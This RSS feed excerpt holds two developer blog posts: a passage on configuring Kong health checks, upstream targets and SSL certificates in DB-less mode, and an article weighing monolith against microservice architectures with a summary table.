<p><strong>Passive</strong> checks (also known as circuit breakers), where Kong analyzes the ongoing traffic being proxied and determines the health of targets based on their behavior responding to requests.</p>
<p>Details about Active and Passive health check which was taken from <a href="https://docs.konghq.com/gateway-oss/2.5.x/health-checks-circuit-breakers/" rel="nofollow noopener" target="_blank">konghq docs</a></p>
<blockquote><p><strong>Active health checks</strong><br />
as the name implies, actively probe targets for their health. When active health checks are enabled in an upstream entity, Kong will periodically issue HTTP or HTTPS requests to a configured path at each target of the upstream. This allows Kong to automatically enable and disable targets in the balancer based on the probe results.<br />
The periodicity of active health checks can be configured separately for when a target is healthy or unhealthy. If the interval value for either is set to zero, the checking is disabled at the corresponding scenario. When both are zero, active health checks are disabled altogether.<br />
<strong><em>Note</em></strong>: Active health checks currently only support HTTP/HTTPS targets. They do not apply to Upstreams assigned to Services with the protocol attribute set to &#8220;tcp&#8221; or &#8220;tls&#8221;.</p>
<p><strong>Passive health checks (circuit breakers)</strong><br />
Passive health checks, also known as circuit breakers, are checks performed based on the requests being proxied by Kong (HTTP/HTTPS/TCP), with no additional traffic being generated. When a target becomes unresponsive, the passive health checker will detect that and mark the target as unhealthy. The ring-balancer will start skipping this target, so no more traffic will be routed to it.<br />
Once the problem with a target is solved and it is ready to receive traffic again, the Kong administrator can manually inform the health checker that the target should be enabled again, via an Admin API endpoint:</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ curl -i -X POST http://localhost:8001/upstreams/my_upstream/targets/10.1.2.3:1234/healthy HTTP/1.1 204 No Content</pre>
<pre></pre>
<p>&nbsp;</p>
<p>This command will broadcast a cluster-wide message to propagate the “healthy” status to the whole Kong cluster. This will cause Kong nodes to reset the health counters of the health checkers running in all workers of the Kong node, allowing the ring-balancer to route traffic to the target again.<br />
Passive health checks have the advantage of not producing extra traffic, but they are unable to automatically mark a target as healthy again: the “circuit is broken”, and the target needs to be re-enabled again by the system administrator.</p></blockquote>
<p>&nbsp;</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"># kong.yml -&gt; upstreams object
upstreams:
  # Auth service 
  - algorithm: round-robin
    name: ${AUTH_URL}
    healthchecks:
      threshold: 2
      active:
        unhealthy:
          http_statuses: ${UPSTREAM_ACTIVE_UNHEALTHY_HTTP_STATUSES}
          timeouts: ${UPSTREAM_ACTIVE_UNHEALTHY_TIMEOUTS_COUNT}
          http_failures: ${UPSTREAM_PASSIVE_UNHEALTHY_TCP_FAILURES_COUNT}
          interval: ${UPSTREAM_UNHEALTHY_REFRESH_INTERVAL}
        type: ${UPSTREAM_HEALTHCHECK_URL_PROTOCOL}
        http_path: ${UPSTREAM_HEALTHCHECK_URL}
        timeout: ${UPSTREAM_HEALTHCHECK_TIMEOUT}
        healthy:
          successes: ${UPSTREAM_ACTIVE_HEALTHY_SUCCESS_COUNT}
          interval: ${UPSTREAM_HEALTHY_REFRESH_INTERVAL}
          http_statuses: ${UPSTREAM_HEALTHY_HTTP_STATUSES}
        https_verify_certificate: false
        concurrency: ${UPSTREAM_ACTIVE_CONCURRENT_REQUEST}
      passive:
        unhealthy:
          http_failures: ${UPSTREAM_PASSIVE_UNHEALTHY_HTTP_FAILURES_COUNT}
          http_statuses: ${UPSTREAM_PASSIVE_UNHEALTHY_HTTP_STATUSES}
          tcp_failures: ${UPSTREAM_PASSIVE_UNHEALTHY_TCP_FAILURES_COUNT}
          timeouts: ${UPSTREAM_PASSIVE_UNHEALTHY_TIMEOUT_COUNT}
        healthy:
          http_statuses: ${UPSTREAM_HEALTHY_HTTP_STATUSES}
          successes: ${UPSTREAM_PASSIVE_HEALTHY_SUCCESS_COUNT}
        type: ${UPSTREAM_HEALTHCHECK_URL_PROTOCOL}
    slots: 10000</pre>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>Let&#8217;s talk about variables in detail to understand what those mean. Also<br />
what I&#8217;m about to discuss here, can be found in kong docs <a href="https://docs.konghq.com/gateway-oss/2.5.x/admin-api/#add-upstream" rel="nofollow noopener" target="_blank">here</a></p>
<p><code>name</code> : implies the service hostname</p>
<p><code>algorithm</code>: which algorithm to use when load-balancing. we using <code>round-robin</code> which is the default value, other options are <code>consistent-hashing</code>, <code>least-connections</code>. Default set to <code>round-robin</code>.<br />
let&#8217;s explore the health checks object.</p>
<p><code>threshold</code>: The minimum percentage of the upstream’s targets’ weight that must be available for the whole upstream to be considered healthy. Default: 0</p>
<p><code>slots</code>: The number of slots in the load balancer algorithm. If the algorithm is set to round-robin, this setting determines the maximum number of time slots. what this means is several time slots are created into a ring balancer and based on weight distributed on the time slots (~10000 default value). Then a pointer is incremented to find a peer to use.</p>
<p><code>active</code> object has 2 nested objects healthy and unhealthy. This configuration will be used by kong to trigger health check events which will be executed by workers. let&#8217;s explore that.</p>
<p><code>active.type</code>: Default set to <code>http</code>. Whether to perform active health checks using HTTP or HTTPS. other supported types are <code>tcp</code>, <code>https</code>, <code>grpc</code>, <code>grpcs</code> but currently <code>tcp</code> will not work for active health check.</p>
<p><code>active.http_path</code>: Default set to <code>/</code>. Service health API path</p>
<p><code>active.timeout</code>: Default set to 1. Socket timeout for active health checks (in seconds).</p>
<p><code>active.concurrency</code>: Number of targets to check concurrently in active health checks. Default set to 10.</p>
<p><code>healthchecks.active.https_verify_certificate</code>: where to verify the SSL certificate of the target. Default set to <code>true</code>.</p>
<p><code>active.healthy.http_statuses</code> &amp; <code>active.unhealthy.http_statuses</code> both refer to an array of status codes that will be used to determine if the target is healthy or unhealthy.</p>
<p><code>active.healthy.interval</code> &amp; <code>active.unhealthy.interval</code> refer to time which will be used to refresh the targets&#8217; healthy statuses. setting to 0 will disable the health check.</p>
<p><code>http_failures</code>, <code>timeouts</code>, <code>tcp_failures</code> all variables refer to the count which will be used to verify if the target is healthy or not. It&#8217;s like a threshold value.</p>
<p><code>successes</code> refer to the successes count.</p>
<p>In the above, we define the upstream object but to work, the upstream object needs targets. which can be defined in the health checks or separately. we will define separately like below</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"># kong.yml -&gt; 
targets object 
targets: - upstream: ${AUTH_URL} 
target: ${AUTH_URL}:80 weight: 1</pre>
<p>&nbsp;</p>
<p><code>targets</code> is an array of values that will attach to the upstreams name property. This is what we defined in the <code>targets.upstream</code>.</p>
<p><code>targets.target</code> refers to the ip:port address combination of the target. if the target is an SRV record just put an SRV record.</p>
<p><code>targets.weight</code> refer to the weight of the target.</p>
<p>Another problem arises when we try to add the SSL certificate in the <code>certificates</code> object in <code>kong.yml</code></p>
<pre><code></code></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"># kong.yml
certificates:
  - cert: # public key
    key: # private key
    snis:
      - name: "" # domain name or wildcard domain name *.example.com</pre>
<pre><code></code></pre>
<p>&nbsp;</p>
<pre><code></code></pre>
<p><code>certificates</code> object looks like the above but <code>cert</code> &amp; <code>key</code> value needs to be defined as multiline</p>
<pre><code> </code></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certificates:
  - cert: |-
      -----BEGIN CERTIFICATE-----
      -----END CERTIFICATE-----
    key: |-
      -----BEGIN PRIVATE KEY-----
      -----END PRIVATE KEY-----
    snis:
      - name: "*.example.com"</pre>
<pre><code> </code></pre>
<p>&nbsp;</p>
<pre><code></code></pre>
<p>As this is not documented in the konghq docs. so anyone who tries to add the certificate will get an invalid certificate error.</p>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/adding-health-checks-and-ssl-certificate-in-kong-db-less-mode" rel="nofollow noopener" target="_blank"> Personal blog</a></p>
<p>You can read our other official blog-posts <a href="/blog">Here</a></p>
<p><strong>In conclusion</strong>, Kong is a great and popular API gateway. The DB-less mode can be really helpful if anyone doesn&#8217;t want to maintain a DB instance. But lack of documentation about the Db-less mode may lead to frustration.<br />
Maintaining up-to-date docs is hard I know because I&#8217;m a developer too so I can tell, Hopefully in the future kong will eventually add proper documentation about Db-less mode.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Trade-offs for Monoliths and Microservices</title>
		<link>/blog/trade-offs-for-monoliths-and-microservices/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Mon, 28 Jun 2021 21:28:49 +0000</pubDate>
				<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[architecture]]></category>
		<category><![CDATA[microservices]]></category>
		<category><![CDATA[monoliths]]></category>
		<guid isPermaLink="false">/?p=2594</guid>

					<description><![CDATA[When developing an application, we as software engineers face different types of architecture for building an application. Among them, Monoliths and Microservices are considered to be the latest trends. When designing an application, we can consider both, monolithic or microservice-based architectures. What we will choose depends on how the structure of an application is contoured [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>When developing an application, we as software engineers face different types of architecture for building an application. Among them, Monoliths and Microservices are considered to be the latest trends.</p>
<p>When designing an application, we can consider both, monolithic or microservice-based architectures. What we will choose depends on how the structure of an application is contoured by functional requirements and available resources. However, each architecture has a set of trade-offs, that need to be thoroughly examined before deciding on the final architecture of the application.</p>
<p>These trade-offs cover <code>development complexity</code>, <code>scalability</code>, <code>time to deploy</code>, <code>flexibility</code>, <code>operational cost</code>, and <code>reliability</code>. I&#8217;ll try to explain each trade-off below&#8230;</p>
<h2>Development Complexity:</h2>
<p><code>Development complexity</code> refers to the effort required to deploy and manage an application. So deployment and managing a monolith or microservice-based application are different so let&#8217;s discuss those development complexities for monoliths and microservices-based applications.</p>
<h3>Programming Language</h3>
<p><strong>Monolith:</strong> The monolith application usually revolves around a single framework or programming language. For example, we can say we&#8217;ll build a Booking application using the Django web framework(which depends on python programming language).<br />
<strong>Microservice:</strong> The microservices application can be deployed using multiple languages. For example Same Booking application we considered above, let&#8217;s say the application has two services <code>Login</code> &amp; <code>Book ticket</code>.<br />
We might consider building the <code>Login service</code> using the Go programming language, on the other hand for <code>Book ticket</code> we can use Python.</p>
<h3>Management of Code Repository</h3>
<p><strong>Monolith:</strong> The monolith application usually belongs to a single code repository.<br />
<strong>Microservice:</strong>  Each Microservice requires its own separate code repository.</p>
<blockquote>
<h4>Note: We might think it&#8217;s better to manage a single repository than many, but the development complexity scale radically when more functionality is added to the project. As for microservice we team can work on a functionality independently as all functionality has its own codebase.</h4>
</blockquote>
<h3>Development Cycle</h3>
<p><strong>Monolith:</strong> The Development Cycle of a  monolith application is sequential as a single team will work on the codebase at a time. Also, the team needs to be careful about adding new functionality as the team may need to modify multiple functions to ensure backward compatibility.<br />
<strong>Microservice:</strong> The Development Cycle of each microservice is concurrent as each team works on each functionality separately on their own codebase.</p>
<h2>Scalability:</h2>
<p>The term <code>scalability</code> refers to how an application scales up and down when the incoming traffic increase exponentially or there&#8217;s a sudden demand on a particular functionality of the application.</p>
<h3>Traffic</h3>
<p><strong>Monolith:</strong> As the traffic increases, we need to replicate the entire unit with all the functionalities. For example, if we need to scale the Payment functionality, we need to scale other functionalities respectively.<br />
hence this is heavy on resource consumption such as CPU and Memory.<br />
<strong>Microservice:</strong> As the traffic increase on a particular functionality or service we can easily identify which service or functionality needs to scale and only scale that up will solve the traffic issue.</p>
<h3>Resource Consumption</h3>
<p><strong>Monolith:</strong> As the traffic example describes, we can conclude monoliths are heavy on resource consumption such as CPU and Memory. As we are using more space than actually needed.<br />
<strong>Microservice:</strong> As each functionality belongs to a separate service in a microservice application, the resource consumption is on-demand which means is, we need to scale up to the current need for the moment if we don&#8217;t need that in the future, we can easily scale down.</p>
<h2>Time to Deploy:</h2>
<p>The term <code>Time to Deploy</code> refers to building a deployment pipeline and deploying new features or bug fixes easily.</p>
<h3>Delivery Pipeline</h3>
<p><strong>Monolith:</strong> As in the monolithic approach only one delivery pipeline is needed to deploy the whole application. As we deploy the whole application each time it came with high risk with each deployment as if the deployment didn&#8217;t work leads to a disastrous situation if the release fails as it&#8217;ll take down the entire application which means there is a higher risk of violating the zero downtime principle, which aims that application should be available to the end-user/consumers 24/7.</p>
<p><strong>Microservice:</strong> On the other hand, each service needs its own delivery pipeline so that we can deliver each service individually. As we add a new feature to a specific service only that service needs to be deployed and if that service deployment won&#8217;t go smoothly as we expected, only that service will go down but the application should be available to the consumers. As such, there is less risk to take down the entire application with each release. Consequently, Microservices allow an increased velocity of feature development as we can have more releases with less risk. </p>
<h2>Flexibility:</h2>
<p>The term <code>Flexibility</code> refers to the ability to incorporate new technologies and adapt to new principles and tooling. There are moments when it&#8217;s better to use a different programming language before a specific feature or modify our application for a specific platform.</p>
<p><strong>Monolith:</strong>  In Monolithic application, this type of modification may lead to rewritten or restructured the entire project prior to that new technology need. This leads to the conclusion that monolith application has a low flexibility rate.</p>
<p><strong>Microservice:</strong> On the other hand, each service is purposely built to be loosely coupled and allows independent changes to services as we writing or restructuring one functionality is more achievable than rewriting the entire stack.</p>
<h2>Operational Cost:</h2>
<p>The term <code>Operational Cost</code> refers to the necessary resources to build, deploy and release a product. A low initial cost to spin up an application is certainly inciting.</p>
<p><strong>Monolith:</strong>  This is the case we all observe in the monolithic architecture where only one code base is needed and there&#8217;s only one delivery pipeline to deploy the entire application.</p>
<p><strong>Microservice:</strong> On the other hand, each service requires the maintenance of multiple codebases and delivery pipelines and the dependencies of maintaining different programming languages if we require to use them in a microservice.</p>
<p>This scenario demonstrates the whole application/product development process. The situation is flipped when new functionalities are added and the application needs to be scaled to cope with high customer demand. </p>
<blockquote>
<p>Note: Maintaining a monolith over time imposes more complexity and consumes more resources when replication, as we all know maintaining an application, is more costly than developing one from scratch. On the other hand, the Operational cost for a microservice is directly proportional to the required resource at the time. Scalability is performed on each service and adding new components is a defect to operation in an application which makes microservice more scalable than monoliths.</p>
</blockquote>
<h2>Reliability:</h2>
<p>The term <code>Reliability</code> refers to the ability to recover from failure and waste monitoring the application all the time.</p>
<p><strong>Monolith:</strong>  If an application goes to a failed state the entire stack will need to be troubleshot and recovered for availability.</p>
<p><strong>Microservice:</strong> A distributed amount of functions that interact with each other via the network calls. If a component fails then only that component will need to recovery.</p>
<blockquote>
<p>Note: In Microservices, it is possible to have representative metrics and logs of a separate unit while with monoliths getting granular visibility for each functionality is difficult as all the metrics and logs for the entire application will be aggregated together.</p>
</blockquote>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/trade-offs-for-monoliths-and-microservices" rel="nofollow noopener" target="_blank"> Personal blog</a></p>
<p>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">Here</a></p>
<h2>Summary</h2>
<table>
<thead>
<tr>
<th style="text-align: center">Trade-Offs</th>
<th style="text-align: center">Types</th>
<th style="text-align: center">Monoliths</th>
<th style="text-align: center">Microservices</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">Development Complexity</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Programming Language</td>
<td style="text-align: center">One language</td>
<td style="text-align: center">Multiple languages</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Management of Code Repository</td>
<td style="text-align: center">One repository</td>
<td style="text-align: center">Multiple repositories</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Development Cycle</td>
<td style="text-align: center">Sequential</td>
<td style="text-align: center">Concurrent</td>
</tr>
<tr>
<td style="text-align: center">Scalability</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">High Traffic</td>
<td style="text-align: center">Replication of the entire stack</td>
<td style="text-align: center">Replication of specific service/functionality</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Resouce Consumption</td>
<td style="text-align: center">Overconsumption of resources</td>
<td style="text-align: center">On-demand resource consumption</td>
</tr>
<tr>
<td style="text-align: center">Time to Deploy</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Delivery Pipeline</td>
<td style="text-align: center">One delivery pipeline</td>
<td style="text-align: center">Multiple delivery pipeline</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Deployment process</td>
<td style="text-align: center">Easy</td>
<td style="text-align: center">Comparatively harder</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Deployment</td>
<td style="text-align: center">Entrie stack deployment</td>
<td style="text-align: center">Separate functionality deployment</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Velocity</td>
<td style="text-align: center">Low velocity at scale</td>
<td style="text-align: center">High velocity at scale</td>
</tr>
<tr>
<td style="text-align: center">Flexibility</td>
<td style="text-align: center"></td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
<tr>
<td style="text-align: center">Operational Cost</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Initial cost</td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Scaling cost</td>
<td style="text-align: center">High</td>
<td style="text-align: center">Low</td>
</tr>
<tr>
<td style="text-align: center">Reliability</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Recovery</td>
<td style="text-align: center">Recovery of the entire stack</td>
<td style="text-align: center">Recovery of the failed component only</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Visibility(metrics/logs)</td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
</tbody>
</table>
<p>In conclusion, we can say each application architecture has a set of trade-offs that need to be considered at the beginning of a project. But more importantly, it is paramount to understand how the application will be maintained in the future e.g. at scale, under load, supporting multiple releases a day, etc.</p>
<p>There is no <code>Predefined/Golden rule</code> to build a product, but a good understanding of the trade-offs will provide a clear understanding of the roadmap to build the product goals we&#8217;re trying to achieve. Now regardless of what architecture we choose to build the project, as long as the project is coupled with an efficient delivery pipeline and design pattern, the ability to adopt new technologies and how easily we can add the feature to cloud-native deployment remains certain.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
